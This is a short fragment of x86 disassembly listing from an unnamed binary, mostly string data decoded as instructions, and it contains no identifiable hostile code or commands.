  433a70:	add    BYTE PTR [ecx+0x0],bl
  433a73:	dec    edi
  433a74:	add    BYTE PTR [eax+0x0],dl
  433a77:	add    BYTE PTR [eax],al
  433a79:	dec    edx
  433a7a:	add    BYTE PTR [ecx+0x0],dl
  433a7d:	inc    esp
  433a7e:	add    BYTE PTR [edi+0x0],bl
  433a81:	dec    edx
  433a82:	add    BYTE PTR [eax],dh
  433a84:	add    BYTE PTR [ecx],dh
  433a86:	add    BYTE PTR [ebx+0x0],dl
  433a89:	push   ecx
  433a8a:	add    BYTE PTR [ecx],dh
  433a8c:	add    BYTE PTR [edi+0x0],bl
  433a8f:	push   edi
  433a90:	add    BYTE PTR [eax],al
  433a92:	add    BYTE PTR [ebx+0x0],cl
  433a95:	pop    edx
  433a96:	add    BYTE PTR [esi],dh
  433a98:	add    BYTE PTR [edi+0x0],bl
  433a9b:	inc    ebx
  433a9c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433aa0:	add    BYTE PTR [edi+0x0],bl
  433aa3:	push   edi
  433aa4:	add    BYTE PTR [ebx],dh
  433aa6:	add    BYTE PTR [esi+0x0],cl
  433aa9:	push   ebp
  433aaa:	add    BYTE PTR [edi+0x0],bl
  433aad:	dec    edx
  433aae:	add    BYTE PTR [eax],al
  433ab0:	add    BYTE PTR [edi+0x0],dl
  433ab3:	aaa    
  433ab4:	add    BYTE PTR [eax],bh
  433ab6:	add    BYTE PTR [edi+0x0],bl
  433ab9:	pop    eax
  433aba:	add    BYTE PTR [edi+0x0],cl
  433abd:	inc    edi
  433abe:	add    BYTE PTR [edi+0x0],bl
  433ac1:	xor    al,0x0
  433ac3:	push   eax
  433ac4:	add    BYTE PTR [ecx+0x0],cl
  433ac7:	push   ebp
  433ac8:	add    BYTE PTR [eax],al
  433aca:	add    BYTE PTR [edi+0x0],dl
  433acd:	push   esp
  433ace:	add    BYTE PTR [ebx+0x0],cl
  433ad1:	add    BYTE PTR [eax],al
  433ad3:	add    BYTE PTR [edx+0x53],dl
  433ad6:	inc    esp
  433ad7:	push   ebx
  433ad8:	xchg   DWORD PTR ds:0x3457a290,ebp
  433ade:	bound  eax,QWORD PTR [ebx-0x6c]
  433ae1:	aam    0x88
  433ae3:	mov    ecx,0x41a1ff72
  433ae8:	sbb    eax,DWORD PTR [eax]
  433aea:	add    BYTE PTR [eax],al
  433aec:	push   esp
  433aed:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433af1:	addr16 push edi
  433af3:	bound  bx,DWORD PTR [edx+0x45]
  433af7:	outs   dx,BYTE PTR ds:[esi]
  433af8:	pop    esp
  433af9:	je     0x433b6e
  433afb:	ja     0x433b3e
  433afd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433b05:	js     0x433b76
  433b07:	jp     0x433b78
  433b09:	jns    0x433b6f
  433b0b:	jp     0x433b75
  433b0d:	je     0x433b73
  433b0f:	jp     0x433b73
  433b11:	cs jo  0x433b78
  433b14:	bound  eax,QWORD PTR [eax]
	...
